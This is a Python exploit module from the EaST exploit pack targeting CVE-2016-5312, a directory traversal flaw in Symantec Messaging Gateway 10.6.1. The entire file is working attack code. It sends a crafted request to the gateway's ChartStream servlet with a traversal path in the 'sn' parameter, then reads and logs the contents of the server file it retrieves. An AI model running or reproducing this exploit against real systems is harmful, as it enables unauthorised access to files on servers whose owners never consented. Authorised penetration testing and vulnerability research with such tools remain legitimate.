#!/usr/bin/env python
# The exploit is a part of EaST pack - use only under the license agreement
# specified in LICENSE.txt in your EaST distribution

import sys
import urllib2

sys.path.append("./core")
from core.Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_symantec_messaging_gateway_dt"
INFO['DESCRIPTION'] = "Symantec Messaging Gateway 10.6.1 - Directory Traversal"
INFO['VENDOR'] = "https://www.symantec.com/products/threat-protection/messaging-gateway"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['']
INFO["CVE Name"] = "CVE-2016-5312"
INFO["NOTES"] = """A charting component in the Symantec Messaging Gateway control center does not properly sanitize user input submitted for charting requests."""

INFO['CHANGELOG'] = "29 Sep 2016. Written by Gleg team."
INFO['PATH'] = 'Exploits/Web/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS['HOST'] = '192.168.1.123', dict(description = 'Target IP')
OPTIONS['PORT'] = 80, dict(description = 'Target Port')
OPTIONS["FILENAME"] = '../../WEB-INF/lib', dict(description = 'Path to remote file')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.filename = None
        
    def make_url(self, path = ''):
        return 'http://{}:{}{}'.format( self.host, self.port, path)
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.filename = self.args.get('FILENAME', '')
        
    def run(self):
        self.args()
        self.log('Try download file: {}'.format(self.filename))
        
        url = self.make_url('/brightmail/servlet/com.ve.kavachart.servlet.ChartStream?sn=' + self.filename)
        self.log('Sending request {}'.format(url))
        
        try:
            fd = urllib2.urlopen(url)
            data = fd.read()
                
            self.log('Found ' + self.filename)
            self.log('===Content of file===')
            self.log(data)
            self.log('=========End=========')
            
            self.finish(True)
        except Exception as ex:
            self.log(ex)
        
        self.finish(False)


if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1", 80)
    e.run()
